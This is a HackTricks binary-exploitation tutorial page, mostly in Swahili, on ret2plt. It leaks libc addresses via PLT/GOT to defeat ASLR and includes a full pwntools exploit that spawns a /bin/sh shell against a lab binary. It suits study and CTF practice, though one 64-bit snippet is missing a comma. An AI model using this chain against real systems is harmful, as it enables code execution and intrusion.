# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Lengo la mbinu hii litakuwa **leak an address from a function from the PLT** ili kuweza bypass ASLR. Hii ni kwa sababu, kwa mfano, ukileak an address ya function `puts` kutoka libc, basi unaweza **calculate where is the base of `libc`** na kuhesabu offsets kufikia functions nyingine kama **`system`**.

Hili linaweza kufanywa na payload ya `pwntools` kama ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

Pia angalia jinsi anwani ya `main` inavyotumika katika exploit ili wakati `puts` inapoisha utekelezaji wake, the **binary calls `main` again instead of exiting** (hivyo leaked address itaendelea kuwa halali).

> [!CAUTION]
> Tambua jinsi ili hili lifanye kazi **binary haiwezi kujengwa na PIE** au lazima uwe **umepata leak ili bypass PIE** ili kujua anwani ya PLT, GOT and main. Vinginevyo, unahitaji bypass PIE kwanza.

Unaweza kupata [**mfano kamili wa bypass huu hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Huu ulikuwa exploit ya mwisho kutoka kwa **mfano** huo:

<details>
<summary>Mfano kamili la exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Mambo ya kuzingatia (kisasa)

- **`-fno-plt` builds** (common in modern distros) inabadilisha `call foo@plt` kuwa `call [foo@got]`. Ikiwa binary haina `foo@plt` stub, unaweza bado leak the resolved address kwa `puts(elf.got['foo'])` na kisha **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) ili kuruka ndani ya libc mara lazy binding itakapokamilika.
- **Full RELRO / `-Wl,-z,now`**: GOT ni read‑only lakini ret2plt bado inafanya kazi kwa leaks kwa sababu unachofanya ni kusoma GOT slot tu. Ikiwa symbol haijawahi kuitwa, ret2plt yako ya kwanza pia itafanya lazy binding kisha ichapishe resolved slot.
- **ASLR + PIE**: ikiwa PIE imewezeshwa, kwanza leak code pointer (mf., saved return address, function pointer, au `.plt` entry kupitia format‑string/infoleak nyingine) ili kuhesabu PIE base, kisha unda ret2plt chain na PLT/GOT addresses zilizorebase‑iwa.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries ni valid BTI landing pads (`bti c`), hivyo unapotumia exploit kwenye binaries zilizo na BTI ni bora kuruka ndani ya PLT stub (au gadget nyingine iliyo BTI‑annotated) badala ya moja kwa moja ndani ya libc gadget bila BTI, vinginevyo CPU itatoa `BRK`/`PAC` failures.
- **Quick resolution helper**: ikiwa target function bado haijatambuliwa na unahitaji leak kwa single shot, chain PLT call mara mbili: kwanza `elf.plt['foo']` (kuwekeza) kisha tena `elf.plt['foo']` ukiweka GOT address kama argument ili kuchapisha slot iliyojazwa sasa.

## Mifano mengine & Marejeo

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, hatua ya kwanza ni kujaza overflow hadi byte 0x00 ya canary kisha kuita puts na leak yake. Kwa kutumia canary, ROP gadget huundwa kuitwa puts ili leak anwani ya puts kutoka GOT na ROP gadget nyingine kuitwa `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow katika main kutoka kwa child function. ROP gadget kuitwa puts ili leak anwani ya puts kutoka GOT kisha kuita one gadget.

## Marejeo

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
